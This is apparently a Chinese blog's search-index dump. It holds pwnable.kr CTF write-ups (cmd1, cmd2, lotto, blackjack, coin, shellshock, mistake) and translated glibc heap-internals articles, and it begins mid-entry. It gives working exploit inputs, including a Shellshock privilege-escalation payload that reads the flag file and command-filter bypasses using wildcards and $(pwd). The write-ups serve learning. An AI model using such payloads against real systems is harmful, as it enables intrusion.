/home/cmd2/flag flag。然后在/tmp/exploit/c下执行命令/home/cmd2/cmd2”$(pwd)at f**，这里表示执行cmd2程序，相当于*./cmd2 “$(pwd)at f\\“就可以得到flag了。其原理就是利用”$(pwd)at”构造出/tmp/xiaohong404/cat**命令。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"cmd1","slug":"Pwnable_kr/cmd1","date":"2020-10-20T02:01:26.000Z","updated":"2020-10-20T07:26:42.000Z","comments":true,"path":"2020/10/20/Pwnable_kr/cmd1/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/20/Pwnable_kr/cmd1/","excerpt":"","text":"查看cmd1.c源代码 putenv函数是添加或者改变一个环境变量。 filter函数的作用是通过strstr函数匹配$flag、sh、tmp$三个字符串，如果检测到这三个字符串，则函数返回值不为0，会导致主函数退出，无法执行system函数。所以这里需要将我们输入的字符串隐藏起来，绕过filter函数的检查，但这里我们需要得到flag。又不能直接输入flag，于是想到可以使用通配符来代替flag。system命令的默认PWD环境变量应该是与这个程序的PWD环境变量相同，这个环境变量是什么，就是默认“./”执行的文件夹目录，一般是根据程序调用的bash窗口目录来的。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"lotto","slug":"Pwnable_kr/lotto","date":"2020-10-19T12:56:14.000Z","updated":"2020-10-20T00:50:22.000Z","comments":true,"path":"2020/10/19/Pwnable_kr/lotto/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/19/Pwnable_kr/lotto/","excerpt":"","text":"查看lotto.c源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play()&#123; int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1)&#123; printf(&quot;error. tell admin\\n&quot;); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf(&quot;error2. tell admin\\n&quot;); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; // win! if(match == 6)&#123; system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;bad luck...\\n&quot;); &#125;&#125;void help()&#123; printf(&quot;- nLotto Rule -\\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\\n&quot;); printf(&quot;for more details, follow the link below\\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do? method=playerGuide#buying_guide01\\n\\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\\n&quot;);&#125;int main(int argc, char* argv[])&#123; // menu unsigned int menu; while(1)&#123; printf(&quot;- Select Menu -\\n&quot;); printf(&quot;1. Play Lotto\\n&quot;); printf(&quot;2. Help\\n&quot;); printf(&quot;3. Exit\\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu)&#123; case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\\n&quot;); return 0; default: printf(&quot;invalid menu\\n&quot;); break; &#125; &#125; return 0;&#125; 程序的大致逻辑为，用户输入6个字符，如果与系统中/dev/urandom随机生成的数相同，累计可以达到6分则最后可拿到flag。显然，需要寻找措施进行绕过，重点在于play函数。 查看play函数 判断用户输入的字符和随机数是否相同本应该是一重for循环，而这里使用了两重for循环，判断的是要求的每一位只要我们输入的6位中存在就可以了，不管是哪一位都可以，只要有六个相等就好了。那只需要一直尝试同一个字符串，总有一次人品好。另外，注意这里随机生成的字符ASCII码范围为1~45，参照ASCII码表，只有 DEC 33 开始才是可见字符，所以需要输入的字符为 ASCII DEC 33 到 45 。 PWN可以编写python脚本，也可以直接自己多次重复输入。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"blackjack","slug":"Pwnable_kr/blackjack","date":"2020-10-19T00:54:25.000Z","updated":"2020-10-19T07:09:34.000Z","comments":true,"path":"2020/10/19/Pwnable_kr/blackjack/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/","excerpt":"","text":"思路分析本题链接打不开了！！！ 只能参考别人的wp 有两个比较关键的点 判断用户下注的金额如果大于用户拥有的金额，则会提示用户不能下注，但程序的漏洞在于如果输入的金额是负数，会直接通过，并且返回输入的下注金额。 如果用户输了，则会扣除用户下注的金额，这里使用简单的减法操作，结合前面下注金额可以为负数，则直接输入一个很大的负数，之后故意输掉比赛，使得金额超过阈值拿到flag。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"coin","slug":"Pwnable_kr/coin","date":"2020-10-18T13:26:46.000Z","updated":"2020-10-19T07:09:48.000Z","comments":true,"path":"2020/10/18/Pwnable_kr/coin/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/18/Pwnable_kr/coin/","excerpt":"","text":"使用netcat连接上远程的服务器 题目是一个游戏，大致意思是，一堆硬币，有一个假币，重量为9，而其他为10，要通过给定的C次机会内找到假币。一共要在30s内找到100个假币，也就是完成100次游戏，最终会给出flag。 思路分析简单的二分法，但这里不能从本地直接连远程服务器，这样会超时，需要通过之前的连接登录远程服务器，之后在服务器上编写脚本运行，下面的代码即可成功运行： 1234567891011121314151617181920212223242526272829303132333435from pwn import *import rep = remote(&#x27;localhost&#x27;, 9007)print(p.recv())for i in range(100): N, C = re.findall(&quot;N=(\\d+) C=(\\d+)&quot;, p.recv())[0] N = int(N) C = int(C) print(N, C) start, end = 0, N-1 while start &lt;= end and C &gt; 0: mid = (start + end) // 2 x = &quot; &quot;.join([str(j) for j in range(start, mid+1)]) # build range list p.sendline(x) res = int(p.recvline()[:-1]) if res % 10 == 0: start = mid+1 # through first half else: end = mid-1 # through second half C -= 1 while C &gt; 0: # use all the tries p.sendline(&quot;0&quot;) p.recv(1024) C -= 1 p.sendline(str(start)) # final answer print(p.recv())print(p.recv()) 注意这里有个细节是需要先进入服务器的/tmp文件夹下，之后自己再主动建立一个新的文件夹，否则会没有权限访问python的库，一直提示未定义的错误。之后在这个新的文件夹下建立一个python文件，可以随便取个名字，这里我就命名为coin.py。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"shellshock","slug":"Pwnable_kr/shellshock","date":"2020-10-18T06:00:22.000Z","updated":"2020-10-19T07:10:16.000Z","comments":true,"path":"2020/10/18/Pwnable_kr/shellshock/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/18/Pwnable_kr/shellshock/","excerpt":"","text":"查看shellshock.c源文件 程序依次运行三个函数*setresuid、setresgid、system* 查看程序的执行权限 以shellshock身份启动时，程序的权限是other权限r-x，而在setresuid和setresgid中使用的是effective gid，也就是shellshock_pwn的权限r-s，当程序执行到system时，程序已经具有shellshock_pwn组权限了。 这个组权限对于flag文件来说是可读的（r–），但是问题在于这一段程序并没有涉及对flag的读操作，权限虽然有了，但怎么办呢？显然这里利用shellshock漏洞。可通过下面的命令证明确实存在shellshock漏洞： 1env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; ./bash -c &quot;echo this is a test&quot; 实际上，“x=’() { :;}; echo vulnerable”​是new出来了一个新的环境变量： 12KEY=xVALUE=() &#123;:;&#125;; echo vulnerable 而当我们后续执行bash的时候，最终会定位到initialize_shell_variables中，这个函数内部会遍历所有的环境变量，而我们设计的VALUE绕过了其中一个export函数的定义检查，使得最终执行的是后面的echo vulnerable串。所以，调用bash的时候，自定义的这个语句就会触发。简而言之，这个漏洞会把用户输入的指令当作代码执行。 于是，我们在这条语句的基础上将自定义语句换为bash -c “cat ./flag”，执行的程序bash -c换成./shellshock(它内部调用了bash -c ‘echo shock_me’)，因此当执行shellshock中的system函数会调用bash，总而自动执行cat flag这条命令，因为./shellshock执行时拿到了shellshock_pwn的权限，从而破壳漏洞可以在此权限上成功执行了cat ./flag，即成功实现了提权操作。 PWN运行下面语句拿到flag 1env x=&#x27;() &#123; :;&#125;; bash -c &quot;cat ./flag&quot;&#x27; ./shellshock 关于shellshock漏洞相关知识可参考： 1、关于ShellShock漏洞的利用过程和原理解析 - CSDN博客 2、破壳（ShellShock）漏洞样本分析报告","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"mistake","slug":"Pwnable_kr/mistake","date":"2020-10-18T05:13:53.000Z","updated":"2020-10-19T07:10:04.000Z","comments":true,"path":"2020/10/18/Pwnable_kr/mistake/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/18/Pwnable_kr/mistake/","excerpt":"","text":"查看mistake.c源文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123; printf(&quot;can&#x27;t open password %d\\n&quot;, fd); return 0; &#125; printf(&quot;do not bruteforce...\\n&quot;); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf(&quot;read error\\n&quot;); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf(&quot;input password : &quot;); scanf(&quot;%10s&quot;, pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf(&quot;Password OK\\n&quot;); system(&quot;/bin/cat flag\\n&quot;); &#125; else&#123; printf(&quot;Wrong Password\\n&quot;); &#125; close(fd); return 0;&#125; 整个程序的执行逻辑为，打开系统目录下保存密码的文件，之后开辟了一个数组读取该密码文件中的密码并保存，之后由用户输入10字节长的密码，存放到一个新的数组中，将用户输入的密码进行与$0x1$进行异或（按位取反）操作，之后将两个数组的内容进行比较，如果数组中的内容相同，则验证通过，可执行system函数拿到flag。 思路分析最自然的想法是直接爆破10位用户的密码，但代码中打印“do not bruteforce”，并且在题目中提示operator priority，因此审查源代码中存在两个运算符以上的语句： 这里$&lt;$运算符的优先级高于$=$运算符，因此实际上fd最终并不是理想的文件描述符，而是0才对。这里的正确写法如下： 1if((fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400)) &lt; 0) 而另一方面，0作为文件描述符，它指向的是stdin。 因此，后面的read函数实际上是从stdin读取，而不是password文件，而stdin我们可以控制，则我们可以输入任意已知的密码，之后再输入与$0x1$异或的值，使得两次输入的密码相匹配。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"Heap II","slug":"Heap/Heap-II","date":"2020-10-17T13:32:43.000Z","updated":"2020-10-19T07:10:32.000Z","comments":true,"path":"2020/10/17/Heap/Heap-II/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/17/Heap/Heap-II/","excerpt":"","text":"[原版传送门] UNDERSTANDING THE GLIBC HEAP IMPLEMENTATION前一部分解释了malloc和free的基本行为。我们看到，malloc通过分配内存块来处理内存分配请求。每个块不仅存储程序员将与之交互的malloc返回的“用户数据”区域，还存储与该块关联的元数据。 我们看到了堆管理器的基本块分配策略是如何工作的，并且看到了当没有已经释放的块可以被用于响应用户的请求时，如何从堆的顶部创建新块。 接下来这篇文章，将解释这种块回收策略是如何工作的，即如何将已经分配的块被free然后保存起来，并最终回收以服务之后的malloc请求。许多堆利用技术都依赖于这些内部机制，但是现在，让我们看看堆正确运行时如何通过free回收这些块。 HOW DOES FREE WORK?当程序员完成malloc的分配块的任务（或malloc兼容的分配，如calloc）后，程序员将通过free将其释放回堆管理器。在C标准定义了free（NULL）什么也不做，但对于所有其他free调用，堆管理器的第一份工作是使指针指回其相应的块。堆管理器通过从传递给free的指针中减去该块元数据的大小来实现此目的。 从指针到块的这种转换之所以有效，是因为用户数据区域位于块内，但是，仅当传递给free的指针确实来自malloc的实时分配时，该转换才有效。如果将其他一些指针传递给free，则堆管理器可能释放或回收无效的块，从而导致内存损坏问题，这可能导致进程崩溃，甚至可能使黑客远程接管该进程。 因此，free首先进行了一些基本的检查，检查是否这个释放的块是显然无效的，防止之后再分配。如果其中任何一个检查失败，则程序中止。检查包括： 检查分配是否在8字节（或64位为16字节）边界上对齐，因为malloc确保所有分配都对齐。 检查块的大小字段是否可能，因为它可能太小，太大，或者没有对齐字节，还是因为它与进程地址空间的末尾重叠。 检查块位于arena的边界内。 通过检查位于下一个块开头的元数据中的相应“ P”位，检查该块是否尚未标记为空闲。 这里的堆管理器检查并不详尽。攻击者控制的指向数据的指针可能会绕过这些完整性检查，并且仍会在进程中触发内存崩溃。我们将在以后的文章中更详细地介绍这一点。 FREE CHUNK METADATA在上一篇文章中，展示了已分配块如何将元数据与程序员使用的“用户数据”区域一起存储。这些已经分配的块存储了“块大小”以及其元数据中的三个位，分别称为“ A”，“ M”和“ P”。这些位可分别帮助堆管理器记住该块是否是从非主arena分配的，是否是通过mmap进行堆外分配的，以及前一个块是否是空闲的。 空闲块也存储元数据。类似已分配的块，他们存储“块大小”，“A”和“P”字段，但他们不使用“M”字段，因为一个MMAP过的块在释放期间将永远是munmap-ed（取消虚拟内存映射），而不是转变成一个free块回收，即空闲块的”M“字段是一个确定的值，一定不会通过mmap从堆外分配。 空闲块还使用称为“边界标签”的技术在用户数据区域之后存储信息。这些边界标签在块之前和之后携带大小信息。这允许从任何已知的块开始并在任何方向上遍历块，从而能够非常快速地合并相邻的空闲块。 这些释放的块存储在相应的”free bins“中，这些“free bins”用作链表。这要求每个空闲块还存储指向其他块的指针。由于释放的块中的“用户数据”（根据定义）是免费供堆管理器使用的，因此堆管理器将释放的块中的“用户数据”区域重新定位为额外的元数据所在的位置。 RECYCLING MEMORY WITH BINS在内部，堆管理器需要记录释放的块，以便malloc可以在分配请求期间重用它们。在最初的实现中，堆管理器可以通过将所有释放的块简单地存储在某个巨大的链表中来完成此操作。这可以工作，但是会使malloc变慢。由于malloc是大多数程序的高利用率组件，因此这种缓慢将对系统上运行的程序的整体性能产生巨大影响。 为了提高性能，堆管理器而是维护一系列称为“ bins”的列表，这些列表旨在最大程度地提高分配和释放的速度。共有5种类型bins：每个线程62 small bins, 63 large bins, 1 unsorted bin, 10 fast bins and 64 tcache bins 。 small，large，unsorted bins是最古老的bin类型，其实现这里将其称为堆的基本回收策略。fast bins和tcache bins是在这些基础上的优化。 容易混淆的地方在于，在堆管理器的源代码中，small，large，unsorted bins都一起存在同一数组中。索引0没有被使用，索引1是unsorted bin，2-64是small bins，65-127是large bins。 CHUNK RECYCLING: THE BASIC STRATEGY在tcache和fastbin优化之前，首先来看一下堆管理器使用的基本回收策略。 free的基本算法如下（低地址在前，高地址在后）： 如果块在元数据中设置了M位，则分配是在堆外分配的，则应该被munmap。 否则，如果该块之前的块是空闲的，则将之前的块向后合并以创建更大的空闲块。 同样，如果此块之后的块是空闲的，则将之后的块将向前合并以创建更大的空闲块。 如果这个之后可能更大的块与堆的“顶部”相邻，则整个块将被存储到堆的末端，而不是存储在“ bin”中。 否则，该块将被标记为空闲并将其放置在适当的bin中。 SMALL BINSsmall bins是最容易理解的基本bin。它们有62个，每个small bin都存储相同大小的固定块。在32位系统上小于512字节（在64位系统上小于1024字节）的每个块都有一个对应的small bin。由于每个small bin仅存储一个特定大小的块，它们会自动排序，因此在这些列表中插入和删除条目的速度非常快。 LARGE BINSsmall bins的策略非常适合小型分配，但是我们无法为每个可能的块大小都设置一个存储区。对于超过512字节（64位为1024字节）的块，堆管理器将改为使用large bins。 63个large bins中的每个大都与small bins以相同的方式运行，但是它们不是存储固定大小的块，而是存储一定大小范围内的块。每个large bins的大小范围都设计为与small bins的块大小或其他large bins的范围不重叠。换句话说，在给定块的大小的情况下，恰好只有一个对应于此大小的small bin或large bin。 由于large bins存储一定大小范围的块，因此向large bin中插入一个块必须手动进行排序，并且从链表中的分配也需要遍历该列表。这使得large bins本质上比small bins慢。但是，在大多数程序中，large bins的使用频率较低。这是因为平均意义上说，程序更倾向于以更高的频率分配（或释放）小的分配块。出于相同的原因，large bins的使用频率会聚集在覆盖范围较小的large bin中；最小的large bin仅覆盖从512字节到576字节的64字节范围的块，而第二大的large bin则覆盖256KB的大小范围的块。最大的large bin覆盖了1MB以上的所有已释放块。 UNSORTED BIN堆管理器使用称为unsorted bins的优化缓存层面进一步改善了基本的分配算法。此优化基于以下观察结果：通常这些free的块都聚集在一起，并且释放后通常立即分配大小相似的块。例如，释放树或列表的程序通常会一次释放大多数分配空间中的所有条目，或者更新列表中条目的程序可能会释放前一个条目，然后再分配新的空间替换条目。 在这些情况下，在将较大的块放入正确的bin中之前合并这些释放的块将避免一些开销，并且在分配过程中能够快速返回最近释放的块将简单地加快整个过程。 因此堆管理器引入了unsorted bin，当一个块释放时，堆管理器没有立即将新释放的块放入相应的bin中，而是与相邻的块合并，然后将其转储到常规的unsorted的链表中。在malloc期间，将检查unsorted bins上的每个项目，以查看其是否“适合“请求。如果大小匹配，malloc可以立即使用它。如果没有匹配的块，则malloc之后会将块放入其相应的small bins或large bins中。 FAST BINSfast bins是在之前看到的三个基本bin基础上的进一步优化。这些bins实际上将最近释放的小块保留在“fast-turnaround queue”中，并且在块被释放之后不将其与相邻的块合并，使得这些块始终保持活跃状态，以便在释放后不久若有匹配该块大小的malloc请求，可以立即重新利用该块。 像small bins一样，每个fast bins仅负责单个固定大小的块。有10个这样的fast bins，覆盖大小为16、24、32、40、48、56、64、72、80和88字节的块以及块元数据。 与small bins不同，fast bins的块永远不会与相邻的块合并。实际上，这是堆管理器不会在下一个块的开头设置“ P”位的方式。换句话说，在概念上可以认为，堆管理器不会“真正”释放fast bins中的块。 和small bins相同的部分在于，fast bins也仅覆盖固定的大小的块，并且会自动排序分类，因此插入和删除的速度也非常快。而且，由于fast-binned的块永远不会合并，因此它们只需要被存储在单链表，而不需要存储在双向链表中，因为其不存在合并块时从列表中进行删除的操作。 当然，fast bin的缺点是，fast bin块不会“真正”释放或合并，最终会导致进程的内存空间随着时间的流逝而碎片化和膨胀。为了解决这个问题，堆管理器会定期“合并”堆。通过“实际释放”它（即将其与相邻的空闲块合并），并将生成的空闲块放置到unsorted bins上，以供malloc之后使用，从而“刷新”fast bins中的每个条目。 每当释放任何大于64KB的块（其中64KB为近似值 ），或用户发出大于fast bin可以处理的malloc请求（即对于32位中512字节以上的块或64位中1024字节以上的块）时，或者当程序调用malloc_trim或mallopt时，都会发生“合并”阶段。 TCACHE (PER-THREAD CACHE) BINS堆管理器用来加快分配速度的最终优化是每个线程进行缓存或“ tcache”分配器。首先让我们看一下tcache试图解决的问题。 假如一个计算机系统上的每个进程都同时运行一个或多个线程。多线程允许一个进程执行多个并发操作。例如，一个大容量的Web服务器可能同时具有多个传入请求，并且该Web服务器可能让每个传入请求都在自己的线程上进行服务，而不是让每个请求都排成一队等待服务。 给定进程中的每个线程共享相同的地址空间，也就是说，每个线程可以在内存中看到相同的代码和数据。每个线程都有自己的寄存器和堆栈来存储临时局部变量，但是诸如全局变量和堆之类的资源在所有线程之间共享。 协调访问诸如堆之类的全局资源是一个复杂的话题，它出错可能导致一个称为“race condition”的问题，这会导致难以调试的崩溃，通常也可被黑客利用。 假设在一个线程上提供服务的Web请求尝试更新数据库某一行，而另一个并发Web请求尝试从同一行读取。通常，我们将要确保第二个线程永远不会看到中间写入的值，但因为它正被另一个线程覆盖使用，从而第二个线程可能看到部分或损坏形式的行数据。数据库通过使读写操作看起来像原子操作来解决此问题：如果两个线程试图同时访问同一行，则必须先完成一个操作，然后才能开始下一个操作。解决这些竞争条件的一种非常常见的方法是通过使用锁，使其他同时访问全局资源的请求强制进入顺序队列。 通常，锁是通过一个线程在其使用之前“标记”它拥有全局资源的所有权，然后执行其操作，然后标记该资源不再使用来进行锁定的。如果出现另一个线程并希望使用该资源并看到其他线程正在使用该资源，则该线程将等待，直到另一个线程完成。这样可以确保全局资源一次仅由一个线程使用。但这带来了成本：正在等待资源的线程停滞并浪费时间。这称为“lock contention”（锁争用）。 对于许多全局变量，这个开销还可以接受。但是对于所有线程都在不断使用的堆，此开销会很快导致整个程序的速度变慢。 堆管理器主要通过为每个线程创建自己的arena解决这个问题，直到达到arena分配数目的阈值。此外，tcache 中per-thread cache的目的是减少锁本身的成本，因为锁指令开销很大，并且最终会占用”fast-path“中很大一部分执行时间。此功能已添加到glibc 2.26中的malloc内存分配功能中，并且默认情况下启用。 Per-thread caching通过准备好小块的per-thread bins来加快分配速度。这样，当线程请求一个块时，如果该线程在其tcache上有一个块可用，则它可以为分配提供服务，而不必等待堆锁。 默认情况下，每个线程都有64个单链接的tcache bins。每个bin最多包含7个相同大小的块，在64位系统上为24到1032字节，在32位系统上为12到516字节。 HOW DO CHUNKS END UP IN TCACHE BINS?一个块被释放后，堆管理器将查看该块是否存在与该块大小相对应的tcache容器。与fast bin一样，tcache bin 上的块被视为“正在使用”，并且不会与相邻释放的块合并。 如果匹配该块大小的tcache已满（或者该块对于tcache bin而言太大），则堆管理器将恢复到我们以前的”slow-path“策略，即获取堆锁，然后像以前一样处理该块。 相应的tcache分配策略也非常简单。如果在匹配的tcache bin上有块可用，则给定一个块请求，堆将返回该块，而不会获得堆锁。如果块对于tcache来说太大，继续采用”slow-path“策略。 在我们尝试进行分配的情况下，有一个对应的tcache bin，但如果这个bin已满，我们进行了稍微修改的分配策略。我们不只是获取堆锁并查找单个块，还获取了堆锁，并趁机将尽可能多的这种大小的块提升到tcache，（时间局部性和空间局部性）同时我们仍然保持堆锁，直到tcache bin限制为七个，并且将最后匹配的块返回给用户。 PUTTING IT ALL TOGETHER下面让我们整体回顾一下，glibc中整个malloc、free的实现的算法。 首先，每个分配的内存块是对齐的，并包含元数据以及用户区域。当程序员从堆中请求内存时，堆管理器首先计算出分配请求对应的块大小，然后按以下顺序搜索内存（这里直接考虑多线程）： 如果请求的块大小与tcache bin相匹配，并且tcache bin中有可用的块，则立即分配返回。 如果请求的块很大，则通过mmap分配堆外资源 否则，我们将获得arena heap lock，并且按照以下策略顺序执行： ​ A、尝试fast bin / small bin回收策略 如果存在相应的fast bin，尝试找到一个块匹配（同时用fast bins中的条目（如果存在匹配）预填充tcache） 否则，如果存在对应的small bin，尝试找到一个块匹配（同时预填充tcache） ​ B、解决所有延期释放块 否则，fast bin中的条目将被真正释放，并且将其合并到unsorted bin中。 遍历unsorted bin中的所有条目。如果匹配，则停止。否则，在操作时将unsorted中的条目放在其相应的small/large bin中（同时尽可能提升small bin中的条目到tcache bin） ​ C、默认回到基本回收策略 如果块大小与一个large bin相匹配，则立即搜索相应的large bin ​ D、从头创建一个新的块 否则，将没有可用的块，所以尝试从堆顶部获取一个块 如果堆的顶部空间不足，尝试使用sbrk对其进行扩展 如果遇到了地址空间的其他问题，导致堆不可以扩展，则使用mmap创建一个不连续的扩展并从那里进行分配。 ​ E、如果所有方法均失败，则返回NULL 。 以及相应的free策略： 如果指针为NULL，则C标准将该行为定义为“不执行任何操作”。 否则，通过减去块元数据的大小，将指针指回。 对块执行一些完整性检查，如果完整性检查失败，则中止。 如果该块适合放入tcache bin，则将其存储在其中。 如果该块设置了M位，则通过munmap将其返回给操作系统。 否则，我们将获得arena堆锁，然后： 如果该块适合一个fastbin，将其放在相应的fastbin上，结束。 如果块大于64KB，立即合并fastbin，然后将合并的块放入unsorted bin中。 将数据块与相邻的释放的数据块在small bin、large bin、unsorted bin中前后合并。 如果生成的块位于堆的顶部，则将其合并到堆的顶部，而不是将其存储在bin中。 否则将其存储在unsorted bin中。（Malloc稍后会做工作，将unsorted bin中的条目放入small bin或者large bin中。）","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Basic","slug":"PWN/Heap/Heap-Basic","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Basic/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"Heap I","slug":"Heap/Heap-I","date":"2020-10-16T14:10:00.000Z","updated":"2020-10-19T07:10:26.000Z","comments":true,"path":"2020/10/16/Heap/Heap-I/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/16/Heap/Heap-I/","excerpt":"","text":"原版传送门 WHAT IS THE HEAP, AND WHY DO PEOPLE USE IT?堆是C/C++程序员在程序执行期间手动分配的新的区域。程序员通过调用堆相关的函数如malloc向堆管理器请求这部分区域。这些被分配的内存区域，或者称为“allocations”，之后可以被程序员一直使用、修改或者引用，直到他们不再需要这部分区域，会调用free函数将这部分区域返还给堆管理器。 下面是一个C语言程序分配、使用并且释放堆上的结构体的例子： 123456789101112131415161718typedef struct &#123; int field1; char* field2;&#125; SomeStruct;int main()&#123; SomeStruct* myObject = (SomeStruct*)malloc(sizeof(SomeStruct)); if(myObject != NULL) &#123; myObject-&gt;field1 = 1234; myObject-&gt;field2 = “Hello World!”; do_stuff(myObject); free(myObject); &#125; return 0;&#125; 